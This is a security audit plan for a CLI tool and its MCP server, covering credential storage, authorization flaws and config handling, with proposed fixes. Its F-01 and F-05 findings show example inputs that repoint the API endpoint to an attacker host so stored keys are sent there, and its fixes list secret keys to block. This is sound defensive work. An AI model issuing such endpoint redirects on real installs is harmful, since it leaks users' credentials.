# CLI Security & Quality Hardening — Proposed Plan

**Status:** Proposed — awaiting maintainer review
**Date:** 2026-11-12
**Reviewer:** Senior development & security audit (agent-assisted), pending human sign-off
**Baseline commit:** `e7a7dc3f` (`apps/lanonasis-maas` `main`, `@lanonasis/cli` 3.12.0)
**Scope:** `cli/` (25.4k LOC, 57 commands) and its interaction with `packages/repl-cli`
**Why this exists:** the CLI's automated suite is contract-shaped (mocked API, schema assertions) and now also has live service suites ([#194](https://github.com/lanonasis/lanonasis-maas/pull/194)). Neither shape reviews the CLI *as software* — credential lifecycle, file permissions, the MCP server's authorization model, and transport assumptions. This document records what a read-only audit found, what it could not confirm, and a sequenced remediation plan.

> [!IMPORTANT]
> **This plan contains no code changes.** Every finding below is a proposal. Nothing here has been fixed; the "Fix" sections describe intended work, not completed work.
>
> Two claims from the first audit pass were **overstated** and are corrected in [§2](#2-claim-corrections-required-read). Read §2 before acting on §3.

---

## 1. Method & verification standard

| Aspect | Detail |
|---|---|
| Read | All of `cli/src` (excluding `__tests__`), `cli/jest.config.js`, `cli/package.json`, `cli/CHANGELOG.md`, and the installed `@modelcontextprotocol/sdk` type/handler contract |
| Verified live | File permissions on this machine; `npm audit --omit=dev` (0 vulnerabilities); the deployed MCP server's tool list (`mcp.lanonasis.com/mcp`, 40 tools); `lanonasis` CLI behaviour against `api.lanonasis.com` with a test key |
| Verified by test | Coverage executed locally (`npm test -- --coverage`) |
| **Not** done | No exploitation against any deployed service. No fuzzing. No traffic interception. Findings are from code reading + SDK contract + local file inspection |
| Line citations | Re-verified against `main` @ `e7a7dc3f` (two PRs landed after the first pass; all citations below were re-confirmed) |

**Severity model**

| Sev | Meaning |
|---|---|
| **P0** | Exploitable today with meaningful impact |
| **P1** | Exploitable under a plausible configuration, or a control that is documented but absent |
| **P2** | Robustness / correctness / maintainability with security relevance |
| **P3** | Hygiene |

---

## 2. Claim corrections (required read)

### 2.1 "MCP exposes `revoke_api_key` / `rotate_api_key`" — partially wrong

The audit conflated **three different surfaces**. Corrected picture:

| Surface | `revoke`/`rotate` present? | Evidence |
|---|---|---|
| **Deployed** MCP server (`mcp.lanonasis.com/mcp`, source `apps/mcp-core/src/index.ts:1217,1232`) | **Yes** — `rotate_api_key`, `revoke_api_key` are live tools | Verified in the live `tools/list` response (40 tools) |
| **CLI's own bundled** MCP server (`cli/src/mcp/server/lanonasis-server.ts`) | **No** — zero matches for `revoke_api_key`/`rotate_api_key` in `cli/src/mcp/**`. It advertises `apikey_create` (`:364`) and `apikey_list` (`:386`), both of which are **unimplemented stubs** returning `'API key creation not yet implemented'` (`:794-800`) | `grep -rn "revoke_api_key\|rotate_api_key" cli/src/mcp/` → 0 matches |
| **CLI command surface** (`onasis api-keys`) | **No** — `create`, `list`, `get`, `update`, `delete` only (`cli/src/commands/api-keys.ts:236,372,429,476,604`). **But** `cli/src/commands/completion.ts:291,298` advertises `api-keys revoke` and `api-keys rotate` to shell completion | `cli/src/commands/api-keys.ts` — no `revoke`/`rotate` subcommand exists |

Two related traps worth recording:

- `cli/src/mcp/schemas/tool-schemas.ts:208,392` defines `ApiKeyRevokeSchema`, and `cli/src/mcp/access-control.ts:190` defines `revokeAccess()`. **Neither is wired to any tool**, and `revokeAccess()` is about *memory access rules*, not API keys. The naming makes both look implemented.
- Net effect: a user who types `onasis api-keys revoke <id>` (because completion offers it) gets an unknown-command error, and there is **no CLI path to revoke a key** even though the deployed MCP server can do it.

### 2.2 "Memory routes use `encodeURIComponent`, topics don't" — confirmed, with a third case

| Route set | Encoding | Evidence |
|---|---|---|
| Memory (`getMemory`/`updateMemory`/`deleteMemory`) | ✅ `encodeURIComponent(resolvedId)` | `cli/src/utils/api.ts:1078,1098,1119` |
| **Topics** (`getTopic`/`updateTopic`/`deleteTopic`) | ❌ raw `${id}` — and the id is **raw user input** (`onasis topic get <id>` → `cli/src/commands/topics.ts:200,257,310,334,351`) | `cli/src/utils/api.ts:1163,1168,1173` |
| API keys | ⚠️ raw `${resolvedKeyId}`, but the value is UUID-constrained by `resolveApiKeyId` (`cli/src/commands/api-keys.ts:68`) | `cli/src/commands/api-keys.ts:436,511,584,613,630` |
| Analytics query strings | ✅ built with `URLSearchParams` | `cli/src/commands/api-keys.ts:806,762` |

### 2.3 "MCP server auth bypass on HTTP/WS" — right mechanism, overstated reachability

The header-reading defect is real and confirmed (§3.1), but the first pass described it as a live remote bypass. That was wrong: **the CLI's bundled MCP server implements stdio only.** `lanonasis mcp start --transport http|ws` reaches `server.start()`, which throws `'HTTP transport not yet implemented'` / `'WebSocket transport not yet implemented'` (`cli/src/mcp/server/lanonasis-server.ts:1649,1654`). The CLI's own `lanonasis-mcp` binary calls `startStdio()` only (`cli/src/mcp-server-entry.ts:81`).

Reclassified from **P0 (live remote bypass)** to **P1 (latent P0 + dead authorization path)**. The reasoning and the exact conditions under which it becomes P0 are in §3.1.

---

## 3. Findings

### Summary

| ID | Sev | Finding | Primary location |
|---|---|---|---|
| F-01 | P0 | `system_config` MCP tool reads/writes **any** config key, including the OAuth token | `cli/src/mcp/server/lanonasis-server.ts:410,980` |
| F-02 | P1 | MCP auth reads headers from the wrong object; stdio-trust heuristic is unsafe by construction | `cli/src/mcp/server/lanonasis-server.ts:1228,1257` |
| F-03 | P1 | OAuth token + refresh token persisted **world-readable** (`0644`) in `~/.maas/config.json` | `cli/src/utils/config.ts:25,48,305` |
| F-04 | P1 | `onasis config get <key>` prints any config value; `config set <key> <value>` writes any key | `cli/src/commands/config.ts:44,95,106,112` |
| F-05 | P1 | Credentials follow user-configurable endpoints (`--api-url`, `config set-url`, `config set mcp-server-url`) with no scheme/host validation | `cli/src/index.ts:70`, `cli/src/utils/config.ts:1620`, `cli/src/utils/mcp-client.ts:243` |
| F-06 | P1 | `X-Auth-Method` documented as opt-in (VERA C-2) but sent unconditionally on the two hot paths | `cli/src/utils/api.ts:754-767`, `cli/src/utils/mcp-client.ts:530-543` |
| F-07 | P1 | `auth logout` never revokes server-side; no `api-keys revoke/rotate` command exists | `cli/src/utils/config.ts:2009` |
| F-08 | P2 | `process.exit()` inside the API client kills the host process on 401/403/429 | `cli/src/utils/api.ts:851,862,868` |
| F-09 | P2 | Axios client has no timeout and no redirect cap; `proxy: false` disables egress controls | `cli/src/utils/api.ts:636` |
| F-10 | P2 | Topic routes interpolate raw user input into request paths | `cli/src/utils/api.ts:1163,1168,1173` |
| F-11 | P2 | Dead / duplicated code with security-relevant names | `cli/src/utils/crypto-utils.ts`, `cli/src/utils/hash-utils.ts` |
| F-12 | P2 | Coverage is **below** the repo's own gate; the MCP server is at 0% | `cli/jest.config.js` (thresholds) |
| F-13 | P3 | Passwords accepted via argv; `--content-file` uploads arbitrary local files; persisted exec path | `cli/src/commands/auth.ts`, `cli/src/commands/memory.ts`, `cli/src/commands/mcp.ts` |

---

### F-01 — P0 — `system_config` exposes the whole config namespace (read **and** write)

**Evidence**

```
cli/src/mcp/server/lanonasis-server.ts:410   name: 'system_config', description: 'Get or update system configuration'
cli/src/mcp/server/lanonasis-server.ts:980   private async handleSystemConfig(args: any): Promise<any>
  :982       return { [args.key]: this.config.get(args.key) };   // read: ANY key
  :1013      this.config.set(args.key, args.value); await this.config.save();   // write: ANY key
cli/src/utils/config.ts:2286   get<T = unknown>(key: string): T { return this.config[key] as T; }   // raw property read
```

`config.get()` is an unfiltered property lookup with **no deny-list**. The config object holds `token` (OAuth JWT) and `refresh_token` in plaintext (`cli/src/utils/config.ts:25,48`).

**Impact**

- `system_config {action:'get', key:'token'}` returns the raw OAuth access token to the connected MCP client.
- `system_config {action:'set', key:'apiUrl', value:'https://attacker.example'}` persists an endpoint override; every subsequent CLI request then carries `X-API-Key`/`Authorization` to that host (see F-05).
- Writes land in `~/.maas/config.json` (see F-03) and survive restarts.

**Fix**

- Split into explicit allow-lists: readable keys (`apiUrl`, `mcpServerUrl`, `maxConnections`, `transport`) and settable keys (a stricter subset, endpoint values validated per F-05).
- Never return `token`, `refresh_token`, `token_expires_at`, or any `*Key*`/`*Secret*`/`*Token*` property.
- Return a redaction marker instead of a value for denied keys, so the tool stays useful for introspection without leaking.

**Verification** — unit test: `system_config get key=token` returns a redaction marker, not the token; `set key=apiUrl` with a non-canonical host is rejected.

---

### F-02 — P1 (latent P0) — MCP authorization model is unimplemented, and its trust heuristic is unsafe

**Evidence — the SDK contract**

```
@modelcontextprotocol/sdk/dist/esm/types.d.ts:7922
  export interface RequestInfo { headers: IsomorphicHeaders; url?: URL }
@modelcontextprotocol/sdk/dist/esm/types.d.ts:7939
  export interface MessageExtraInfo { requestInfo?: RequestInfo; authInfo?: AuthInfo; ... }
```

The HTTP headers arrive on the handler's **second** argument (`extra.requestInfo.headers`). The first argument is the JSON-RPC message, whose type (`Request = Infer<typeof RequestSchema>`) has `method`/`params`/`id` — **no `headers` field**.

**Evidence — the CLI reads the wrong object**

```
cli/src/mcp/server/lanonasis-server.ts:506   const { name, arguments: args } = request.params;   // request = JSON-RPC message
cli/src/mcp/server/lanonasis-server.ts:513   await this.authenticateRequest(request, clientId);
cli/src/mcp/server/lanonasis-server.ts:1228  extractAuthInfo(request) → const headers = request.headers || {}   // always {}
cli/src/mcp/server/lanonasis-server.ts:1257  isStdioConnection(request) → !request.headers || Object.keys(request.headers).length === 0   // always true
```

Consequences:

1. `request.headers` is **always `undefined`** → `isStdioConnection()` is **always `true`** → every request takes the stdio branch (`:1201`) and is authenticated with the local user's stored credentials.
2. `extractAuthInfo()` can **never** see `Authorization` or `X-API-Key` → the "validate provided credentials" branch (`:1213-1217`) is unreachable; client-supplied credentials cannot be honoured.
3. `extractClientId()` reads `request.meta?.clientId` (always undefined) → `generateClientId()` (`:1173`) mints a new client id **per request** → no session, no per-client audit trail, and a re-authentication on every tool call.

**Why this is P1 and not P0 today**

The bundled server is stdio-only: `lanonasis mcp start --transport http|ws` throws `'HTTP transport not yet implemented'` (`cli/src/mcp/server/lanonasis-server.ts:1649,1654`). The `lanonasis-mcp` binary calls `startStdio()` (`cli/src/mcp-server-entry.ts:81`). Over stdio, "authenticate with locally stored credentials" *is* the intended local-trust model, so there is no live remote bypass.

**Why it is still P1**

- The defect is a **time bomb**: the moment the HTTP/WS transports are implemented, the "no headers ⇒ stdio ⇒ trusted" heuristic silently classifies every remote client as trusted-local, with the local user's full tool surface (memory read/write/delete + F-01). Nothing in the code forces the transports to fix it.
- The authorization path the author intended (client presents a credential) is dead code today and will fail closed-open when revived.
- `mcp start --transport http --allow-public-bind` advertises a public bind and *then* fails with a confusing "not yet implemented" (`cli/src/commands/mcp.ts:729-736`) — operators may work around it by exposing stdio instead.
- `--allow-public-bind` and its warning ("Any host that can reach {host}:{port} would be able to call the server with the saved credentials", `cli/src/mcp/server/lanonasis-server.ts:1620-1636`) describe a risk the current code does not have over stdio — and will have over HTTP once implemented. The warning is currently *inaccurate in both directions*.

**Fix**

- Read headers from `extra.requestInfo?.headers` (and `extra.authInfo`) — never from the JSON-RPC message.
- Determine transport from the transport layer, **not** from header presence.
- Require a presented credential on every non-stdio transport; keep local-credential trust for stdio only.
- Make `extractClientId` derive a stable id (session id, or `mcp-session-id`), so authentication and audit are per-client.
- Add an explicit "transports other than stdio are not implemented" error **before** the host/bind argument is processed, and correct the `--allow-public-bind` warning text to state the stdio-only reality.
- Add a regression test that fails if any credential-free request is accepted on a non-stdio transport.

**Decision needed (§5, Q1)** — see below.

---

### F-03 — P1 — OAuth tokens persisted world-readable

**Evidence**

```
cli/src/utils/config.ts:25    token?: string | undefined;
cli/src/utils/config.ts:48    refresh_token?: string | undefined;
cli/src/utils/config.ts:1626  this.config.token = token;
cli/src/utils/config.ts:305   async atomicSave(): Promise<void>
cli/src/utils/config.ts:323     await fs.writeFile(tempPath, JSON.stringify(this.config, null, 2), 'utf-8');   // no mode
```

Observed on this machine:

```
-rw-r--r--  /root/.maas/config.json        ← 0644  (holds token / refresh_token)
-rw-------  /root/.maas/auth-cache.json    ← 0600
-rw-------  /root/.lanonasis/api-key.enc   ← 0600
drwxr-xr-x  /root/.maas                    ← 0755
```

The same object is copied to `config.backup.<ts>.json` (`cli/src/utils/config.ts:333-349`) with inherited permissions. The credential *cache* and the *encrypted key* are correctly `0600` — the plaintext-token file is the outlier.

**Impact** — on a multi-user host, any local account can read the OAuth access token and refresh token.

**Fix** — `mkdir(configDir, { mode: 0o700 })`; write `config.json` and backups with `{ mode: 0o600 }`; on load, `chmod` existing files (migration for users who already have a `0644` config); ensure the temp file and the lock file are `0600` as well.

---

### F-04 — P1 — `config get` / `config set` are unfiltered credential read/write

**Evidence**

```
cli/src/commands/config.ts:44    .command('set <key> <value>')
cli/src/commands/config.ts:95    config.set(key, value);                      // default branch: ANY key
cli/src/commands/config.ts:106   .command('get <key>')
cli/src/commands/config.ts:112   const value = config.get(key);                // raw property read
```

**Impact**

- `onasis config get token` prints the OAuth JWT to stdout → shell scrollback, terminal recording, CI logs, screen shares.
- `onasis config set token <value>` and `onasis config set vendorKey lano_...` write **plaintext credentials** into `config.json` — re-introducing exactly the "legacy plaintext vendor key" format that `cli/src/utils/config.ts:174-179` refuses to use. The CLI can therefore be walked back into the state it warns about.
- `config set apiUrl` / `mcp-server-url` are the persisted half of F-05.

**Fix**

- Read path: deny-list (`token`, `refresh_token`, `token_expires_at`, `tokenExpiry`, `vendorKey`, `*Secret*`, `*ApiKey*`) → print a redaction marker; add an explicit `config get --show-secrets` for deliberate access.
- Write path: allow-list the settable keys; route any credential key to the encrypted `ApiKeyStorage` instead of `config.json`; reject unknown keys instead of silently storing them.

---

### F-05 — P1 — Credentials follow user-configurable endpoints with no validation

**Evidence**

```
cli/src/index.ts:70            process.env.MEMORY_API_URL = opts.apiUrl;            // --api-url
cli/src/utils/config.ts:402    getApiUrl(): string { const baseUrl = process.env.MEMORY_API_URL || this.config.apiUrl || ... }
cli/src/utils/config.ts:1620   async setApiUrl(url: string) { this.config.apiUrl = url; await this.save(); }   // no validation
cli/src/utils/mcp-client.ts:243-246  serverUrl = config.get('mcpServerUrl') ?? ...
cli/src/utils/api.ts:745-770   config.headers['X-API-Key'] = vendorKey   // attached to whatever baseURL was resolved
```

`config set-url` validates URL *syntax* only (`cli/src/commands/config.ts:190-196`) — `http://` is accepted, so the key can leave the process unencrypted. `config set mcp-server-url <url>` persists an arbitrary credential sink.

**Impact** — `onasis --api-url https://x.example memory list` sends the vendor key to `x.example`. Persisted variants survive restarts. Combined with F-09 (no redirect cap), a redirect from a canonical host to an attacker host also forwards `X-API-Key` (axios strips `Authorization` cross-host but keeps custom headers).

**Fix**

- Reject non-HTTPS endpoints except loopback (`127.0.0.1`, `::1`, `localhost`).
- Require an explicit opt-in flag (e.g. `--allow-non-canonical-host`) to point at a host outside `api.lanonasis.com` / `mcp.lanonasis.com` / `auth.lanonasis.com`, and warn loudly when a credential will be attached to it.
- Set `maxRedirects: 0` for authenticated requests, or strip `X-API-Key` on cross-host redirect.

**Decision needed (§5, Q2)** — warn-only vs hard-refuse.

---

### F-06 — P1 — A documented security control is not implemented on the hot paths

**Evidence**

```
cli/CHANGELOG.md:48 (VERA C-2, shipped in 3.11.4)
  "The auth-method header is only attached when CLI_VERBOSE=true.
   Removes a covert channel that advertised the credential family in production traffic."

cli/src/utils/api.ts:754,758,763,767        config.headers['X-Auth-Method'] = ...   ← unconditional
cli/src/utils/mcp-client.ts:530,537,543     headers['X-Auth-Method'] = ...          ← unconditional
cli/src/commands/mcp.ts:329,332              if (verboseAuth) headers[...]           ← honours the rule
cli/src/mcp/server/lanonasis-server.ts:1333  if (verboseAuth) headers[...]           ← honours the rule
```

The control was applied to the MCP command/server paths but **not** to the REST client or the MCP client — i.e. not to the two paths that carry the credential on ordinary traffic. The credential *family* (`vendor_key` vs `jwt`) is therefore disclosed on every request, including to user-configured hosts (F-05).

**Fix** — gate `X-Auth-Method` on `CLI_VERBOSE` in `api.ts` and `mcp-client.ts`, or (if the server genuinely needs it) amend the changelog entry to state the real behaviour and the reason. Do not leave the documentation and the code disagreeing.

---

### F-07 — P1 — `logout` does not revoke, and there is no CLI revoke path

**Evidence**

```
cli/src/utils/config.ts:2009  async logout(): Promise<void>
  :2012  this.config.token = undefined;
  :2020  const apiKeyStorage = await this.getApiKeyStorage();
  :2024  if (typeof storage.clear === 'function') { await storage.clear(); }    // local only
```

No server-side revocation call is made. The deployed MCP server can revoke (`revoke_api_key`), but the CLI exposes no such command (§2.1).

**Impact** — after `onasis auth logout` on a shared or imaged machine, the key **remains valid server-side**. A user reasonably reads "logout" as "this credential no longer works".

**Fix** — add `onasis api-keys revoke|rotate` (matching the completion schema at `cli/src/commands/completion.ts:291,298`, which already promises them); make `logout` attempt server-side revocation and state clearly whether revocation succeeded; add a `lanonasis api-keys list --show-revoked` so users can audit.

---

### F-08 — P2 — `process.exit()` inside the API client

```
cli/src/utils/api.ts:851   process.exit(1);   // 401
cli/src/utils/api.ts:862   process.exit(1);   // 403
cli/src/utils/api.ts:868   process.exit(1);   // 429
```

The client already has a `noExit` escape hatch, but the default path terminates the **host** process. Any embedder — including the MCP server, which imports this client — dies on an authentication failure instead of receiving an error. It also makes the client awkward to unit-test.

**Fix** — throw a typed error (`AuthRequiredError`, `RateLimitedError`) and let the command layer decide the exit code; keep `process.exit` exclusively in `src/commands/**` and `src/index.ts`.

---

### F-09 — P2 — No HTTP timeout, no redirect cap, proxies disabled

```
cli/src/utils/api.ts:636   this.client = axios.create({
cli/src/utils/api.ts:637     proxy: false // Bypass proxy to avoid redirect loops in containerized environments
```

- **No `timeout`** → a stalled endpoint hangs the CLI indefinitely. `health`/`status` are the most exposed.
- **No `maxRedirects`** → default 21 redirects, and custom headers (`X-API-Key`) are forwarded across hosts (F-05).
- **`proxy: false`** → corporate proxies are ignored. The comment cites redirect loops; the same class of failure is better solved with `maxRedirects` + a proxy-aware retry. It is also an egress-control gap: the CLI cannot be routed through a proxy that inspects traffic.

**Fix** — set an explicit `timeout` (and honour a `LANONASIS_HTTP_TIMEOUT` override); set `maxRedirects: 0` for authenticated calls and re-issue manually if a redirect is genuinely expected; reconsider `proxy: false` now that redirects are bounded.

---

### F-10 — P2 — Topic routes interpolate raw user input

```
cli/src/utils/api.ts:1163   this.client.get(`/api/v1/topics/${id}`);
cli/src/utils/api.ts:1168   this.client.put(`/api/v1/topics/${id}`, data);
cli/src/utils/api.ts:1173   this.client.delete(`/api/v1/topics/${id}`);
```

`id` is the raw argument from `onasis topic get|update|delete <id>` (`cli/src/commands/topics.ts:200,257,310,334,351`). A value containing `/` or `..` alters the request path on the same host. The memory routes already do this correctly (`encodeURIComponent`, §2.2).

**Fix** — `encodeURIComponent(id)` on all three topic routes; consider a shared `encodeId()` helper so the rule cannot drift again (it already has).

---

### F-11 — P2 — Dead and duplicated code with security-relevant names

| Path | State | Note |
|---|---|---|
| `cli/src/utils/crypto-utils.ts` | 0% covered, **no importers** | AES-256-GCM + PBKDF2 (fine), but it also computes an **unsalted** `hashApiKey(vendorKey)` (`:154,189`) and would write it to disk |
| `cli/src/utils/hash-utils.ts` | no importers | Duplicate of `shared/hash-utils.ts` (the header says so) |
| `cli/src/utils/transport-routing.ts` | 0% covered | 15-line file, no importers |
| `cli/src/index-simple.ts` (858 LOC) vs `cli/src/index.ts` (1036 LOC) | — | Two entry points; unclear which is authoritative |
| `cli/src/mcp/schemas/tool-schemas.ts` | — | Defines `ApiKeyRevokeSchema` that is never wired (§2.1) |
| `apikey_create` / `apikey_list` MCP tools | — | Advertised in the tool list; return "not yet implemented" (`lanonasis-server.ts:794-800`) |

**Fix** — delete the unreferenced modules, or wire them deliberately; reconcile the two entry points; remove or implement the stub tools so the advertised tool surface matches reality.

---

### F-12 — P2 — Coverage is below the repo's own gate, and the MCP server is at 0%

`npm test -- --coverage` on `main` @ `e7a7dc3f`:

```
All files                  23.40% stmts | 23.32% branch | 22.39% funcs | 23.60% lines
Jest: "global" coverage threshold for statements (25%) not met: 23.4%
Jest: "global" coverage threshold for branches  (25%) not met: 23.32%
Jest: "global" coverage threshold for lines    (25%) not met: 23.6%
Jest: "global" coverage threshold for functions (25%) not met: 22.39%
```

`npm run test:coverage` therefore **fails today**. Worst-covered areas:

| Area | Coverage | Why it matters |
|---|---|---|
| `src/mcp/**` (server, access-control, tool schemas, enhanced client) | **0%** (server 8.74%) | F-01/F-02 live here and are untested |
| `src/core/**` (error-handler, welcome, dashboard, power-mode, progress) | **0%** | Error rendering is the last line of defence for credential leakage |
| `src/commands/auth.ts` | **6.11%** stmts / **1.17%** branch | The entire auth surface: PKCE, password, refresh, failure counting |
| `src/commands/config.ts` | **0%** | F-04 lives here |
| `src/commands/mcp.ts` | **0%** | The `--host` guard and transport selection are untested |
| `src/commands/topics.ts`, `organization.ts`, `init.ts` | **0%** | |
| `src/commands/memory.ts` | 18.08% | |
| `src/utils/config.ts` | 72.79% | The best-covered critical file — a good model |

**Fix** — raise the floor to the current actual (≈23%) and add a **per-directory floor** so `src/mcp` cannot sit at 0%; then lift `src/mcp` and `src/commands/auth.ts` as part of the F-01/F-02 work. Pair this with the live suites from #194 rather than replacing them.

---

### F-13 — P3 — Hygiene

| Item | Evidence | Note |
|---|---|---|
| Password on argv | `cli/src/commands/auth.ts` (`--password`, `-p`) | Visible in `ps` and shell history. Prefer `--password-stdin`/env var; interactive prompt is already masked |
| Arbitrary local file upload | `onasis memory create --content-file <path>` | Intended, but no notice that the file's contents leave the machine |
| Persisted exec path | `config set mcp-server-path <path>` → later `spawn('node', [path])` (`cli/src/ux/implementations/ConnectionManagerImpl.ts:237`, `cli/src/mcp-server.ts:124`) | By design (local exec), but the value is unvalidated and persisted |
| Per-request client identity | `generateClientId()` per request (`lanonasis-server.ts:1173`) | See F-02 |

---

## 4. Controls that are already sound

Recording these so the remediation does not regress them:

- **MCP non-loopback bind refusal** — `cli/src/commands/mcp.ts:697-711` and `cli/src/mcp/server/lanonasis-server.ts:1620-1636` refuse a non-loopback `--host` without `--allow-public-bind`.
- **OAuth PKCE (S256) + `state`** — `cli/src/commands/auth.ts:845-854`.
- **Masked password prompts** — inquirer `type: 'password'`.
- **Prescan** — report directory `0700`, `--save` performs no mutation/quarantine (`cli/src/commands/prescan.ts:35,162`), reports are value-stripped.
- **Auth-cache design** — domain-separated salted fingerprint (not a lookup hash), `0600`, 5-minute TTL (`cli/src/utils/config.ts:1210-1213,1297`).
- **Credential redaction in error text** — `lano_`/`lns_`/`sk_`/`pk_` patterns and JWT shapes (`cli/src/utils/config.ts:865-870`).
- **Auth probe semantics** — an unreachable gateway is never treated as a rejected credential (`cli/src/utils/config.ts:893`).
- **`--api-url` cannot silently downgrade to plaintext on canonical hosts** — the interceptor resolves canonical hosts itself (`cli/src/utils/api.ts:710-724`); the gap is only for *user-configured* hosts (F-05).
- **Supply chain** — `npm audit --omit=dev` → 0 vulnerabilities; gitleaks clean on `main`.
- **Live service suites** — `npm run test:live` in both `cli/` and `packages/repl-cli` (#194), double-gated by `LANO_TEST_API_KEY` **and** `RUN_LIVE_SERVICE_TESTS=1`.

---

## 5. Open decisions for maintainers

| # | Question | Recommendation |
|---|---|---|
| **Q1** | Should the HTTP/WS MCP transports require a **presented credential** even from loopback clients, or stay local-trust? | Require it. Loopback is not a trust boundary on a shared host, and it removes the "no headers ⇒ trusted" heuristic entirely. Note the transports are unimplemented today, so there is no migration cost |
| **Q2** | Non-canonical API hosts: hard-refuse or warn? | Warn + require `--allow-non-canonical-host` for one release, then hard-refuse. Hard-refusing immediately would break self-hosted and staging setups |
| **Q3** | Should `config get token` remain possible at all? | Yes, but only behind an explicit `--show-secrets` and with a warning. Some workflows legitimately need to read a token |
| **Q4** | Is `cli/src/index-simple.ts` still a supported entry point? | If not, delete it — it is a second 858-line CLI surface with no test coverage |
| **Q5** | Do we want the CLI's bundled MCP server to keep shipping, given the deployed `mcp-core` server is the one with real transports and real auth? | Consider making `lanonasis-mcp` a thin client of `mcp-core`. This would delete F-01, F-02 and much of `src/mcp/**` rather than patching them |

---

## 6. Remediation sequence

Each step is a separate PR to `lanonasis/lanonasis-maas`, small enough to review in one sitting, ordered so that no step depends on an unmerged one.

| # | PR | Addresses | Notes |
|---|---|---|---|
| 1 | `fix(cli): confine config reads/writes to an allow-list` | F-01, F-04 | Deny-list secrets in `config.get`; allow-list `config set`; redaction markers |
| 2 | `fix(cli): write config.json and backups with 0600` | F-03 | `mkdir 0700`, `mode 0600`, migration `chmod` on load |
| 3 | `fix(cli): restore the VERA C-2 X-Auth-Method opt-in` | F-06 | One-line-per-path change; or amend the changelog if the server needs it |
| 4 | `fix(cli): validate configured endpoints and cap redirects` | F-05, F-09 | https-only except loopback; `maxRedirects`; request timeout |
| 5 | `fix(cli): read MCP request headers from requestInfo` | F-02 | Requires Q1 answered; includes the transport-accuracy error message and the `--allow-public-bind` warning text |
| 6 | `fix(cli): encode topic ids in request paths` | F-10 | One-line-per-route |
| 7 | `fix(cli): return errors instead of exiting inside the API client` | F-08 | Mechanical; improves testability of everything above |
| 8 | `feat(cli): add api-keys revoke and rotate` | F-07 | Closes the completion-schema gap; wire `logout` to revocation |
| 9 | `chore(cli): remove dead modules and reconcile entry points` | F-11 | Depends on Q4 |
| 10 | `test(cli): raise coverage floors and cover the MCP auth path` | F-12 | Do this **with** steps 1, 5, 8 — not before, so the floors are meaningful |

**Sequencing note:** step 10 should land after the fixes so the new floors lock in the corrected behaviour rather than freezing the current gaps.

---

## 7. Appendix — reproducing the verification

```bash
cd apps/lanonasis-maas

# F-01 / F-02 — the MCP authorization path
grep -n "isStdioConnection\|extractAuthInfo\|handleSystemConfig" cli/src/mcp/server/lanonasis-server.ts
grep -n "requestInfo" cli/node_modules/@modelcontextprotocol/sdk/dist/esm/types.d.ts   # headers live here
grep -n "not yet implemented" cli/src/mcp/server/lanonasis-server.ts                    # transports are stdio-only

# F-03 — file permissions
ls -l ~/.maas ~/.lanonasis
grep -n "writeFile(tempPath" cli/src/utils/config.ts

# F-04 — unfiltered config access
grep -n "config.set(key, value)\|config.get(key)" cli/src/commands/config.ts

# F-05 / F-09 — endpoint handling and axios configuration
grep -n "setApiUrl\|getApiUrl" cli/src/utils/config.ts
grep -n "axios.create" -A 4 cli/src/utils/api.ts

# F-06 — VERA C-2 drift
grep -n "X-Auth-Method" cli/src/utils/api.ts cli/src/utils/mcp-client.ts cli/CHANGELOG.md

# F-07 / §2.1 — revoke/rotate surfaces
grep -rn "revoke_api_key\|rotate_api_key" cli/src/mcp/          # 0 matches
grep -n "name: 'revoke'\|name: 'rotate'" cli/src/commands/completion.ts
grep -n "\.command(" cli/src/commands/api-keys.ts

# F-10 — unencoded routes
grep -nE "client\.(get|post|put|delete)\(\`" cli/src/utils/api.ts

# F-12 — coverage
cd cli && npm test -- --coverage
```

---

**Related:** [#194 — full resource IDs, API-key prefixes, and live service suites](https://github.com/lanonasis/lanonasis-maas/pull/194) (the live suites referenced in §4) · `cli/SECURITY.md` · `docs/context/architecture/decisions/` (ADR-001…003)
